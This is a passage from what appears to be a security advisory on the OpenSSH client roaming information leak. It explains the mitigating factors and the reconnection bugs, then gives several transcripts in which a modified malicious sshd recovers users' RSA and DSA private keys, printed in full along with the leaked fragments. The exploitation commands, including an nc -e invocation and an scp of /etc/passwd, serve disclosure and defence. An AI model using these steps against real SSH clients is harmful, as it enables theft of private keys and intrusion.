$ /usr/bin/scp -P 222 /etc/passwd 127.0.0.1:/tmp
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][exiting]
lost connection

3. Although a man-in-the-middle attacker can reset the TCP connection
between an OpenSSH client and an OpenSSH server (which does not support
roaming), it cannot exploit the information leak without breaking server
host authentication or integrity protection, because it needs to:

- first, append the "resume@...gate.com" algorithm name to the server's
  initial key exchange message;

- second, in response to the client's "roaming@...gate.com" request,
  change the server's reply from failure to success.

In conclusion, an attacker who wishes to exploit this information leak
must convince its target OpenSSH client to connect to a malicious server
(an unlikely scenario), or compromise a trusted server (a more likely
scenario, for a determined attacker).

4. We discovered several non-security bugs, in specific versions and
configurations of OpenSSH, that prevent the client's roaming code from
reconnecting to the server and, as a result, prevent this information
leak from being exploited. In the client, wait_for_roaming_reconnect()
calls ssh_connect(), the same function that successfully established the
first connection to the server; this function supports four different
connection methods, but each method contains a bug and may fail to
establish a second connection to the server:

- In OpenSSH >= 6.5 (released on January 30, 2014), the default
  ssh_connect_direct() method (a simple TCP connection) is called by
  wait_for_roaming_reconnect() with a NULL aitop argument, which makes
  it impossible for the client to reconnect to the server:

 418 static int
 419 ssh_connect_direct(const char *host, struct addrinfo *aitop,
 ...
 424         int sock = -1, attempt;
 425         char ntop[NI_MAXHOST], strport[NI_MAXSERV];
 ...
 430         for (attempt = 0; attempt < connection_attempts; attempt++) {
 ...
 440                 for (ai = aitop; ai; ai = ai->ai_next) {
 ...
 470                 }
 471                 if (sock != -1)
 472                         break;  /* Successful connection. */
 473         }
 474
 475         /* Return failure if we didn't get a successful connection. */
 476         if (sock == -1) {
 477                 error("ssh: connect to host %s port %s: %s",
 478                     host, strport, strerror(errno));
 479                 return (-1);
 480         }

  Incidentally, this error() call displays stack memory from the
  uninitialized strport[] array, a byproduct of the NULL aitop:

$ /usr/bin/ssh -V
OpenSSH_6.8, LibreSSL 2.1

$ /usr/bin/ssh -p 222 127.0.0.1
user@....0.0.1's password:
[connection suspended, press return to resume]ssh: connect to host 127.0.0.1 port \300\350\226\373\341: Bad file descriptor
[reconnect failed, press return to retry]ssh: connect to host 127.0.0.1 port \300\350\226\373\341: Bad file descriptor
[reconnect failed, press return to retry]ssh: connect to host 127.0.0.1 port \300\350\226\373\341: Bad file descriptor
[reconnect failed, press return to retry]ssh: connect to host 127.0.0.1 port \300\350\226\373\341: Bad file descriptor

- The special ProxyCommand "-" communicates with the server through the
  client's stdin and stdout, but these file descriptors are close()d by
  packet_backup_state() at the beginning of wait_for_roaming_reconnect()
  and are never reopened again, making it impossible for the client to
  reconnect to the server. Moreover, the fgetc() that waits for '\n' or
  '\r' on the closed stdin returns EOF and forces the client to exit():

$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013

$ /usr/bin/nc -e "/usr/bin/ssh -o ProxyCommand=- -p 222 127.0.0.1" 127.0.0.1 222
Pseudo-terminal will not be allocated because stdin is not a terminal.
user@....0.0.1's password:
[connection suspended, press return to resume][exiting]

- The method ssh_proxy_fdpass_connect() fork()s a ProxyCommand that
  passes a connected file descriptor back to the client, but it calls
  fatal() while reconnecting to the server, because waitpid() returns
  ECHILD; indeed, the SIGCHLD handler (installed by SSH's main() after
  the first successful connection to the server) calls waitpid() before
  ssh_proxy_fdpass_connect() does:

1782 static void
1783 main_sigchld_handler(int sig)
1784 {
....
1789         while ((pid = waitpid(-1, &status, WNOHANG)) > 0 ||
1790             (pid < 0 && errno == EINTR))
1791                 ;
1792
1793         signal(sig, main_sigchld_handler);
....
1795 }

 101 static int
 102 ssh_proxy_fdpass_connect(const char *host, u_short port,
 103     const char *proxy_command)
 104 {
 ...
 121         /* Fork and execute the proxy command. */
 122         if ((pid = fork()) == 0) {
 ...
 157         }
 158         /* Parent. */
 ...
 167         while (waitpid(pid, NULL, 0) == -1)
 168                 if (errno != EINTR)
 169                         fatal("Couldn't wait for child: %s", strerror(errno));

$ /usr/bin/ssh -V
OpenSSH_6.6.1p1, OpenSSL 1.0.1p-freebsd 9 Jul 2015

$ /usr/bin/ssh -o ProxyUseFdpass=yes -o ProxyCommand="/usr/bin/nc -F %h %p" -p 222 127.0.0.1
user@....0.0.1's password:
[connection suspended, press return to resume]Couldn't wait for child: No child processes

- The method ssh_proxy_connect() fork()s a standard ProxyCommand that
  connects the client to the server, but if a disconnection occurs, and
  the SIGCHLD of the terminated ProxyCommand is caught while fgetc() is
  waiting for a '\n' or '\r' on stdin, EOF is returned (the underlying
  read() returns EINTR) and the client exit()s before it can reconnect
  to the server:

$ /usr/bin/ssh -V
OpenSSH_6.6.1p1 Ubuntu-2ubuntu2, OpenSSL 1.0.1f 6 Jan 2014

$ /usr/bin/ssh -o ProxyCommand="/bin/nc %h %p" -p 222 127.0.0.1
user@....0.0.1's password:
[connection suspended, press return to resume][exiting]

  This behavior is intriguing, because (at least on Linux and BSD) the
  signal() call that installed the main_sigchld_handler() is supposed to
  be equivalent to a sigaction() call with SA_RESTART. However, portable
  versions of OpenSSH override signal() with mysignal(), a function that
  calls sigaction() without SA_RESTART.

  This last mitigating factor is actually a race-condition bug that
  depends on the ProxyCommand itself: for example, the client never
  fails to reconnect to the server when using Socat as a ProxyCommand,
  but fails occasionally when using Netcat.

------------------------------------------------------------------------
Private Key Disclosure example: FreeBSD 10.0, 2048-bit RSA key
------------------------------------------------------------------------

$ head -n 1 /etc/motd
FreeBSD 10.0-RELEASE (GENERIC) #0 r260789: Thu Jan 16 22:34:59 UTC 2014

$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-freebsd 11 Feb 2013

$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA3GKWpUCOmK05ybfhnXTTzWAXs5A0FufmqlihRKqKHyflYXhr
qlcdPH4PvbAhkc8cUlK4c/dZxNiyD04Og1MVwVp2kWp9ZDOnuLhTR2mTxYjEy+1T
M3/74toaLj28kwbQjTPKhENMlqe+QVH7pH3kdun92SEqzKr7Pjx4/2YzAbAlZpT0
9Zj/bOgA7KYWfjvJ0E9QQZaY68nEB4+vIK3agB6+JT6lFjVnSFYiNQJTPVedhisd
a3KoK33SmtURvSgSLBqO6e9uPzV87nMfnSUsYXeej6yJTR0br44q+3paJ7ohhFxD
zzqpKnK99F0uKcgrjc3rF1EnlyexIDohqvrxEQIDAQABAoIBAQDHvAJUGsIh1T0+
eIzdq3gZ9jEE6HiNGfeQA2uFVBqCSiI1yHGrm/A/VvDlNa/2+gHtClNppo+RO+OE
w3Wbx70708UJ3b1vBvHHFCdF3YWzzVSujZSOZDvhSVHY/tLdXZu9nWa5oFTVZYmk
oayzU/WvYDpUgx7LB1tU+HGg5vrrVw6vLPDX77SIJcKuqb9gjrPCWsURoVzkWoWc
bvba18loP+bZskRLQ/eHuMpO5ra23QPRmb0p/LARtBW4LMFTkvytsDrmg1OhKg4C
vcbTu2WOK1BqeLepNzTSg2wHtvX8DRUJvYBXKosGbaoIOFZvohoqSzKFs+R3L3GW
hZz9MxCRAoGBAPITboUDMRmvUblU58VW85f1cmPvrWtFu7XbRjOi3O/PcyT9HyoW
bc3HIg1k4XgHk5+F9r5+eU1CiUUd8bOnwMEUTkyr7YH/es+O2P+UoypbpPCfEzEd
muzCFN1kwr4RJ5RG7ygxF8/h/toXua1nv/5pruro+G+NI2niDtaPkLdfAoGBAOkP
wn7j8F51DCxeXbp/nKc4xtuuciQXFZSz8qV/gvAsHzKjtpmB+ghPFbH+T3vvDCGF
iKELCHLdE3vvqbFIkjoBYbYwJ22m4y2V5HVL/mP5lCNWiRhRyXZ7/2dd2Jmk8jrw
sj/akWIzXWyRlPDWM19gnHRKP4Edou/Kv9Hp2V2PAoGBAInVzqQmARsi3GGumpme
vOzVcOC+Y/wkpJET3ZEhNrPFZ0a0ab5JLxRwQk9mFYuGpOO8H5av5Nm8/PRB7JHi
/rnxmfPGIWJX2dG9AInmVFGWBQCNUxwwQzpz9/VnngsjMWoYSayU534SrE36HFtE
K+nsuxA+vtalgniToudAr6H5AoGADIkZeAPAmQQIrJZCylY00dW+9G/0mbZYJdBr
+7TZERv+bZXaq3UPQsUmMJWyJsNbzq3FBIx4Xt0/QApLAUsa+l26qLb8V+yDCZ+n
UxvMSgpRinkMFK/Je0L+IMwua00w7jSmEcMq0LJckwtdjHqo9rdWkvavZb13Vxh7
qsm+NEcCgYEA3KEbTiOU8Ynhv96JD6jDwnSq5YtuhmQnDuHPxojgxSafJOuISI11
1+xJgEALo8QBQT441QSLdPL1ZNpxoBVAJ2a23OJ/Sp8dXCKHjBK/kSdW3U8SJPjV
pmvQ0UqnUpUj0h4CVxUco4C906qZSO5Cemu6g6smXch1BCUnY0TcOgs=
-----END RSA PRIVATE KEY-----

# env ROAMING="client_out_buf_size:1280" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
user@....0.0.1's password:
[connection suspended, press return to resume][connection resumed]

# cat /tmp/roaming-97ed9f59/infoleak
MIIEpQIBAAKCAQEA3GKWpUCOmK05ybfhnXTTzWAXs5A0FufmqlihRKqKHyflYXhr
qlcdPH4PvbAhkc8cUlK4c/dZxNiyD04Og1MVwVp2kWp9ZDOnuLhTR2mTxYjEy+1T
M3/74toaLj28kwbQjTPKhENMlqe+QVH7pH3kdun92SEqzKr7Pjx4/2YzAbAlZpT0
9Zj/bOgA7KYWfjvJ0E9QQZaY68nEB4+vIK3agB6+JT6lFjVnSFYiNQJTPVedhisd
a3KoK33SmtURvSgSLBqO6e9uPzV87nMfnSUsYXeej6yJTR0br44q+3paJ7ohhFxD
zzqpKnK99F0uKcgrjc3rF1EnlyexIDohqvrxEQIDAQABAoIBAQDHvAJUGsIh1T0+
eIzdq3gZ9jEE6HiNGfeQA2uFVBqCSiI1yHGrm/A/VvDlNa/2+gHtClNppo+RO+OE
w3Wbx70708UJ3b1vBvHHFCdF3YWzzVSujZSOZDvhSVHY/tLdXZu9nWa5oFTVZYmk
oayzU/WvYDpUgx7LB1tU+HGg5vrrVw6vLPDX77SIJcKuqb9gjrPCWsURoVzkWoWc
bvba18loP+bZskRLQ/eHuMpO5ra23QPRmb0p/LARtBW4LMFTkvytsDrmg1OhKg4C
vcbTu2WOK1BqeLepNzTSg2wHtvX8DRUJvYBXKosGbaoIOFZvohoqSzKFs+R3L3GW
hZz9MxCRAoGBAPITboUDMRmvUblU58VW85f1cmPvrWtFu7XbRjOi3O/PcyT9HyoW
bc3HIg1k4XgHk5+F9r5+eU1CiUUd8bOnwMEUTkyr7YH/es+O2P+UoypbpPCfEzEd
muzCFN1kwr4RJ5RG7ygxF8/h/toXua1nv/5pruro+G+NI2niDtaPkLdfAoGBAOkP
wn7j8F51DCxeXbp/nKc4xtuuciQXFZSz8qV/gvAsHzKjtpmB+ghPFbH+T3vvDCGF
iKELCHLdE3vvqbFIkjoBYbYwJ22m4y2V5HVL/mP5lCNWiRhRyXZ7/2dd2Jmk8jrw
sj/akWIzXWyRlPDWM19gnHRKP4Edou/Kv9Hp2V2PAoGBAInVzqQmARsi3GGumpme

------------------------------------------------------------------------
Private Key Disclosure example: FreeBSD 9.2, 1024-bit DSA key
------------------------------------------------------------------------

$ head -n 1 /etc/motd
FreeBSD 9.2-RELEASE (GENERIC) #0 r255898: Fri Sep 27 03:52:52 UTC 2013

$ /usr/bin/ssh -V
OpenSSH_6.2p2, OpenSSL 0.9.8y 5 Feb 2013

$ cat ~/.ssh/id_dsa
-----BEGIN DSA PRIVATE KEY-----
MIIBugIBAAKBgQCEfEo25eMTu/xrpVQxBGEjW/WEfeH4jfqaCDluPBlcl5dFd8KP
grGm6fh8c+xdNYRg+ogHwM3uDG5aY62X804UGysCUoY5isSDkkwGrbbemHxR/Cxe
4bxlIbQrw8KY39xLOY0hC5mpPnB01Cr+otxanYUTpsb8gpEngVvK619O0wIVAJwY
8RLHmLnPaMFSOvYvGW6eZNgtAoGACkP73ltWMdHM1d0W8Tv403yRPaoCRIiTVQOw
oM8/PQ1JVFmBJxrJXtFJo88TevlDHLEghapj4Wvpx8NJY917bC425T2zDlJ4L9rP
IeOjqy+HwGtDXjTHspmGy59CNe8E6vowZ3XM4HYH0n4GcwHvmzbhjJxYGmGJrng4
cRh4VTwCgYAPxVV+3eA46WWZzlnttzxnrr/w/9yUC/DfrKKQ2OGSQ9zyVn7QEEI+
iUB2lkeMqjNwPkxddONOBZB7kFmjOS69Qp0mfmsRf15xneqU8IoMSwqa5LOXM0To
zEpLjvCtyTJcJgz2oHglVUJqGAx8CQJq2wS+eiSQqJbQpmexNa5GfwIUKbRxQKlh
PHatTfiy5p82Q8+TD60=
-----END DSA PRIVATE KEY-----

# env ROAMING="client_out_buf_size:768" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
[connection suspended, press return to resume][connection resumed]

# cat /tmp/roaming-9448bb7f/infoleak
MIIBugIBAAKBgQCEfEo25eMTu/xrpVQxBGEjW/WEfeH4jfqaCDluPBlcl5dFd8KP
grGm6fh8c+xdNYRg+ogHwM3uDG5aY62X804UGysCUoY5isSDkkwGrbbemHxR/Cxe
4bxlIbQrw8KY39xLOY0hC5mpPnB01Cr+otxanYUTpsb8gpEngVvK619O0wIVAJwY
8RLHmLnPaMFSOvYvGW6eZNgtAoGACkP73ltWMdHM1d0W8Tv403yRPaoCRIiTVQOw
oM8/PQ1JVFmBJxrJXtFJo88TevlDHLEghapj4Wvpx8NJY917bC425T2zDlJ4L9rP
IeOjqy+HwGtDXjTHspmGy59CNe8E6vowZ3XM4HYH0n4GcwHvmzbhjJxYGmGJrng4
cRh4VTwCgYAPxVV+3eA46WWZzlnttzxnrr/w/9yUC/DfrKKQ2OGSQ9zyVn7QEEI+
iUB2lkeMqjNwPkxddONOBZB7kFmjOS69Qp0mfmsRf15xneqU8IoMSwqa5LOXM0To
...

# env ROAMING="client_out_buf_size:1024" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
[connection suspended, press return to resume][connection resumed]

# cat /tmp/roaming-279f5e2b/infoleak
...
iUB2lkeMqjNwPkxddONOBZB7kFmjOS69Qp0mfmsRf15xneqU8IoMSwqa5LOXM0To
zEpLjvCtyTJcJgz2oHglVUJqGAx8CQJq2wS+eiSQqJbQpmexNa5GfwIUKbRxQKlh
PHatTfiy5p82Q8+TD60=
...

------------------------------------------------------------------------
Private Key Disclosure example: OpenBSD 5.4, 2048-bit RSA key
------------------------------------------------------------------------

$ head -n 1 /etc/motd
OpenBSD 5.4 (GENERIC) #37: Tue Jul 30 15:24:05 MDT 2013

$ /usr/bin/ssh -V
OpenSSH_6.3, OpenSSL 1.0.1c 10 May 2012

$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAzjortydu20T6wC6BhFzKNtVJ9uYSMOjWlghws4OkcXQtu+Cc
VEhdal/HFyKyiNMAUDMi0gjOHsia8X4GS7xRNwSjUHOXnrvPne/bGF0d4DAxfAFL
9bOwoNnBIEFci37YMOcGArvrEJ7hbjJhGTudekRU78IMOichpdYtkpkGUyGmf175
ynUpCcJdzngL8yF9Iezc8bfXAyIJjzjXmSVu9DypkeUBW28qIuMr5ksbekHcXhQn
w8Y2oEDeyPSGIdWZQcVpdfaAk+QjCEs84c0/AvZoG2iY85OptjNDfynFJSDR5muU
MANXJm5JFfC89fy0nGkQJa1FfNpPjUQY8hWz7QIDAQABAoIBAQC36R6FJrBw8PIh
oxezv8BB6DIe8gx0+6AqinpfTN3Ao9gJPYSMkUBlleaJllLbPDiCTSgXYOzYfRPY
mwfoUJeo1gUCwSMM1vaPJZEhCCGVhcULjmh8RHQW7jqRllh+um74JX6xv34hA1+M
k3cONqD4oamRa17WGYGjT/6yRq9iP/0AbBT+haRKYC4nKWrdkqEJXk10pM2kmH6G
+umbybQrGrPf854VqOdftoku0WjBKrD0hsFZbB24rYmFj+cmbx+cDEqt03xjw+95
n5xM/97jqB6rzkPAdRUuzNec+QNGMvA+4YpItF1vdEfd0N3Jl/VIQ+8ZAhANnvCt
8uRHC7OhAoGBAO9PqmApW1CY+BeYDyqGduLwh1HVVZnEURQJprenOtoNxfk7hkNw
rsKKdc6alWgTArLTEHdULU8GcZ6C0PEcszk2us3AwfPKko8gp2PD5t/8IW0cWxT5
cMxcelFydu8MuikFthqNEX4tPNrZy4FZlOBGXCYlhvDqHk+U7kVIhkLFAoGBANyb
3pLYm7gEs9zoL5HxEGvk9x2Ds9PlULcmc//p+4HCegE0tehMaGtygQKRQFuDKOJV
WGKRjgls7vVXeVI2RABtYsT6OSBU9kNQ01EHzjOqN53O43e6GB4EA+W/GLEsffOZ
pCw09bOVvgClicyekO3kv0lsVvIfAWgxVQY0oZ8JAoGBAIyisquEYmeBHfsvn2oM
T32agMu0pXOSDVvLODChlFJk2b1YH9UuOWWWXRknezoIQgO5Sen2jBHu5YKTuhqY
FTNAWJNl/hU5LNv0Aqr8i4eB8lre2SAAXyuaBUAsFnzxa82Dz7rWwDr4dtTePVws
uvL6Jlk8oIqf62Q1T7ljn5NJAoGAQ8ZHHMobHO+k6ksSwj1TFDKlkJWzm3ep0nqn
zIlv0S+UF+a/s/w1YD0vUUCaiwLCfrZFjxK0lkS3LPyQsyckwRTZ8TYGct5nQcsF
ALHrMYgryfmTfGbZne8R23VX+qZ2k24yN7qVeXSZiM1ShmB4mf1anw3/sCbCYeY1
/tAQjzECf1NKzRdfWRhiBqlEquNshrUNWQxYVnXl+WPgilKAIc1XJ9M0dOCvhwjk
kRTxN77l+klobzq+q+BtPiy9mFmwtwPbAP8l5bVzkZSY2FBDOQiUWS9ZJrCUupeS
Y1tzYFyta0xSod/NGoUd673IgfLnfiGMOLhy+9qhhwCqF10RiS0=
-----END RSA PRIVATE KEY-----

# env ROAMING="client_out_buf_size:2048" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
user@....0.0.1's password:
[connection suspended, press return to resume][connection resumed]

# cat /tmp/roaming-35ee7ab0/infoleak
MIIEogIBAAKCAQEAzjortydu20T6wC6BhFzKNtVJ9uYSMOjWlghws4OkcXQtu+Cc
VEhdal/HFyKyiNMAUDMi0gjOHsia8X4GS7xRNwSjUHOXnrvPne/bGF0d4DAxfAFL
9bOwoNnBIEFci37YMOcGArvrEJ7hbjJhGTudekRU78IMOichpdYtkpkGUyGmf175
ynUpCcJdzngL8yF9Iezc8bfXAyIJjzjXmSVu9DypkeUBW28qIuMr5ksbekHcXhQn
w8Y2oEDeyPSGIdWZQcVpdfaAk+QjCEs84c0/AvZoG2iY85OptjNDfynFJSDR5muU
MANXJm5JFfC89fy0nGkQJa1FfNpPjUQY8hWz7QIDAQABAoIBAQC36R6FJrBw8PIh
oxezv8BB6DIe8gx0+6AqinpfTN3Ao9gJPYSMkUBlleaJllLbPDiCTSgXYOzYfRPY
mwfoUJeo1gUCwSMM1vaPJZEhCCGVhcULjmh8RHQW7jqRllh+um74JX6xv34hA1+M
k3cONqD4oamRa17WGYGjT/6yRq9iP/0AbBT+haRKYC4nKWrdkqEJXk10pM2kmH6G
+umbybQrGrPf854VqOdftoku0WjBKrD0hsFZbB24rYmFj+cmbx+cDEqt03xjw+95
n5xM/97jqB6rzkPAdRUuzNec+QNGMvA+4YpItF1vdEfd0N3Jl/VIQ+8ZAhANnvCt
8uRHC7OhAoGBAO9PqmApW1CY+BeYDyqGduLwh1HVVZnEURQJprenOtoNxfk7hkNw
rsKKdc6alWgTArLTEHdULU8GcZ6C0PEcszk2us3AwfPKko8gp2PD5t/8IW0cWxT5
cMxcelFydu8MuikFthqNEX4tPNrZy4FZlOBGXCYlhvDqHk+U7kVIhkLFAoGBANyb
3pLYm7gEs9zoL5HxEGvk9x2Ds9PlULcmc//p+4HCegE0tehMaGtygQKRQFuDKOJV
WGKRjgls7vVXeVI2RABtYsT6OSBU9kNQ01EHzjOqN53O43e6GB4EA+W/GLEsffOZ
pCw09bOVvgClicyekO3kv0lsVvIfAWgxVQY0oZ8JAoGBAIyisquEYmeBHfsvn2oM
T32agMu0pXOSDVvLODChlFJk2b1YH9UuOWWWXRknezoIQgO5Sen2jBHu5YKTuhqY
FTNAWJNl/hU5LNv0Aqr8i4eB8lre2SAAXyuaBUAsFnzxa82Dz7rWwDr4dtTePVws
uvL6Jlk8oIqf62Q1T7ljn5NJAoGAQ8ZHHMobHO+k6ksSwj1TFDKlkJWzm3ep0nqn
zIlv0S+UF+a/s/w1YD0vUUCaiwLCfrZFjxK0lkS3LPyQsyckwRTZ8TYGct5nQcsF
ALHrMYgryfmTfGbZne8R23VX+qZ2k24yN7qVeXSZiM1ShmB4mf1anw3/sCbCYeY1
/tAQjzECf1NKzRdfWRhiBqlEquNshrUNWQxYVnXl+WPgilKAIc1XJ9M0dOCvhwjk
kRTxN77l+klobzq+q+BtPiy9mFmwtwPbAP8l5bVzkZSY2FBDOQiUWS9ZJrCUupeS

$ /usr/bin/ssh -p 222 127.0.0.1
user@....0.0.1's password:
[connection suspended, press return to resume][connection resumed]

# cat /tmp/roaming-6cb31d82/infoleak
...
uvL6Jlk8oIqf62Q1T7ljn5NJAoGAQ8ZHHMobHO+k6ksSwj1TFDKlkJWzm3ep0nqn
zIlv0S+UF+a/s/w1YD0vUUCaiwLCfrZFjxK0lkS3LPyQsyckwRTZ8TYGct5nQcsF
ALHrMYgryfmTfGbZne8R23VX+qZ2k24yN7qVeXSZiM1ShmB4mf1anw3/sCbCYeY1
/tAQjzECf1NKzRdfWRhiBqlEquNshrUNWQxYVnXl+WPgilKAIc1XJ9M0dOCvhwjk
kRTxN77l+klobzq+q+BtPiy9mFmwtwPbAP8l5bVzkZSY2FBDOQiUWS9ZJrCUupeS
Y1tzYFyta0xSod/NGoUd673IgfLnfiGMOLhy+9qhhwCqF10RiS0=

------------------------------------------------------------------------
Private Key Disclosure example: OpenBSD 5.8, 2048-bit RSA key
------------------------------------------------------------------------

$ head -n 1 /etc/motd
OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015

$ /usr/bin/ssh -V
OpenSSH_7.0, LibreSSL 2.2.2

$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwe9ssfYbABhOGxnBDsPf5Hwypr3tVz4ZCK2Q9ZWWBYnk+KVL
ruLv7NWzeuKF7ls8z4SdpP/09QIIWQO5xWmQ7OM7ndfHWexFoyS/MijorHLvwG1s
17KFF8aC5vcBTfVkWnFaERueyd+mxv+oIrskA3/DK7/Juojkq70aPAdafiWOuVT8
L/2exFuzpSmwiXbPuiPgImO9O+9VQ4flZ4qlO18kZxXF948GisxxkceOYWTIX6uh
xSs/NEGF/drmB4RTAL1ZivG+e4IMxs5naLz4u3Vb8WTDeS6D62WM1eq5JRdlZtGP
vavL01Kv3sYFvoD0OPUU4BjU8bd4Qb30C3719wIDAQABAoIBAG4zFpipN/590SQl
Jka1luvGhyGoms0QRDliJxTlwzGygaGoi7D800jIxgv13BTtU0i4Grw/lXoDharP
Kyi6K9fv51hx3J2EXK2vm9Vs2YnkZcf6ZfbLQkWYT5nekacy4ati7cL65uffZm19
qJTTsksqtkSN3ptYXlgYRGgH5av3vaTSTGStL8D0e9fcrjSdN0UntjBB7QGT8ZnY
gQ1bsSlcPM/TB6JYmHWdpCAVeeCJdDhYoHKlwgQuTdpubdlM80f6qat7bsm95ZTK
QolQFpmAXeU4Bs5kFlm0K0qYFkWNdI16ScOpK6AQZGUTcHICeRL3GEm6NC0HYBNt
gKHPucECgYEA7ssL293PZR3W9abbivDxvtCjA+41L8Rl8k+J0Dj0QTQfeHxHD2eL
cQO2lx4N3E9bJMUnnmjxIT84Dg7SqOWThh3Rof+c/vglyy5o/CzbScISQTvjKfuB
+s5aNojIqkyKaesQyxmdacLxtBBppZvzCDTHBXvAe4t8Bus2DPBzbzsCgYEAz+jl
hcsMQ1egiVVpxHdjtm3+D1lbgITk0hzIt9DYEIMBJ7y5Gp2mrcroJAzt7VA2s7Ri
hBSGv1pjz4j82l00odjCyiUrwvE1Gs48rChzT1PcQvtPCCanDvxOHwpKlUTdUKZh
vhxPK/DW3IgUL0MlaTOjncR1Zppz4xpF/cSlYHUCgYB0MhVZLXvHxlddPY5C86+O
nFNWjEkRL040NIPo8G3adJSDumWRl18A5T+qFRPFik/depomuQXsmaibHpdfXCcG
8eeaHpm0b+dkEPdBDkq+f1MGry+AtEOxWUwIkVKjm48Wry2CxroURqn6Zqohzdra
uWPGxUsKUvtNGpM4hKCHFQKBgQCM8ylXkRZZOTjeogc4aHAzJ1KL+VptQKsYPudc
prs0RnwsAmfDQYnUXLEQb6uFrVHIdswrGvdXFuJ/ujEhoPqjlp5ICPcoC/qil5rO
ZAX4i7PRvSoRLpMnN6mGpaV2mN8pZALzraGG+pnPnHmCqRTdw2Jy/NNSofdayV8V
8ZDkWQKBgQC2pNzgDrXLe+DIUvdKg88483kIR/hP2yJG1V7s+NaDEigIk8BO6qvp
ppa4JYanVDl2TpV258nE0opFQ66Q9sN61SfWfNqyUelZTOTzJIsGNgxDFGvyUTrz
uiC4d/e3Jlxj21nUciQIe4imMb6nGFbUIsylUrDn8GfA65aePLuaSg==
-----END RSA PRIVATE KEY-----

# "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -o ProxyCommand="/usr/bin/nc -w 1 %h %p" -p 222 127.0.0.1
[connection suspended, press return to resume]Segmentation fault (core dumped)

(this example requires a ProxyCommand because of the NULL-aitop bug
described in the Mitigating Factors of the Information Leak section, and
crashes because of the NULL-pointer dereference discussed in the
Mitigating Factors of the Buffer Overflow section)

# cat /tmp/roaming-a5eca355/infoleak
ry+AtEOxWUwIkVKjm48Wry2CxroURqn6Zqohzdra
uWPGxUsKUvtNGpM4hKCHFQKBgQCM8ylXkRZZOTjeogc4aHAzJ1KL+VptQKsYPudc
prs0RnwsAmfDQYnUXLEQb6uFrVHIdswrGvdXFuJ/ujEhoPqjlp5ICPcoC/qil5rO
ZAX4i7PRvSoRLpMnN6mGpaV2mN8pZALzraGG+pnPnHmCqRTdw2Jy/NNSofdayV8V
8ZDkWQKBgQC2pNzgDrXLe+DIUvdKg88483kIR/hP2yJG1V7s+NaDEigIk8BO6qvp
ppa4JYanVDl2TpV258nE0opFQ66Q9sN61SfWfNqyUelZTOTzJIsGNgxDFGvyUTrz
uiC4d/e3Jlxj21nUciQIe4imMb6nGFbUIsylUrDn8GfA65aePLuaSg==

------------------------------------------------------------------------
Private Key Disclosure example: CentOS 7, 1024-bit DSA key
------------------------------------------------------------------------

$ grep PRETTY_NAME= /etc/os-release
PRETTY_NAME="CentOS Linux 7 (Core)"

$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013

$ cat ~/.ssh/id_dsa
-----BEGIN DSA PRIVATE KEY-----
MIIBvQIBAAKBgQDmjJYHvennuPmKGxfMuNc4nW2Z1via6FkkZILWOO1QJLB5OXqe
kt7t/AAr+1n0lJbC1Q8hP01LFnxKoqqWfHQIuQL+S88yr5T8KY/VxV9uCVKpQk5n
GLnZn1lmDldNaqhV0ECESXZVEpq/8TR2m2XjSmE+7Y14hI0cjBdnOz2X8wIVAP0a
Nmtvmc4H+iFvKorV4B+tqRmvAoGBAKjE7ps031YRb6S3htr/ncPlXKtNTSTwaakC
o7l7mJT+lI9vTrQsu3QCLAUZnmVHAIj/m9juk8kXkZvEBXJuPVdL0tCRNAsCioD2
hUaU7sV6Nho9fJIclxuxZP8j+uzidQKKN/+CVbQougsLsBlstpuQ4Hr2DHmalL8X
iISkLhuyAoGBAKKRxVAVr2Q72Xz6vRmbULRvsfG1sSxNHOssA9CWKByOjDr2mo1l
B7oIhTZ+eGvtHjiOozM0PzlcRSu5ZY3ZN2hfXITp9/4oatxFUV5V8aniqyq4Kwj/
QlCmHO7eRlPArhylx8uRnoHkbTRe+by5fmPImz/3WUtgPnx8y3NOEsCtAhUApdtS
F9AoVoZFKEGn4FEoYIqY3a4=
-----END DSA PRIVATE KEY-----

# env ROAMING="heap_massaging:linux" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
...

# strings /tmp/roaming-b7b16dfc/infoleak
jJYHvennuPmKGxfMuNc4nW2Z1via6FkkZILWOO1QJLB5OXqe
kt7t/AAr+1n0lJbC1Q8hP01LFnxKoqqWfHQIuQL+S88yr5T8KY/VxV9uCVKpQk5

# strings /tmp/roaming-b324ce87/infoleak
IuQL
R2m2XjSmE+7Y14hI0cjBdnOz2X8wIVAP0a
Nmtvmc4H+iFvKorV4B+tqRmvAoGBAKjE7ps031YRb6S3htr/ncPlXKtNTSTwaakC
o7l7mJT+lI9v

# strings /tmp/roaming-24011739/infoleak
KjE7ps031YRb6S3htr/ncPlXKtNTSTwaakC
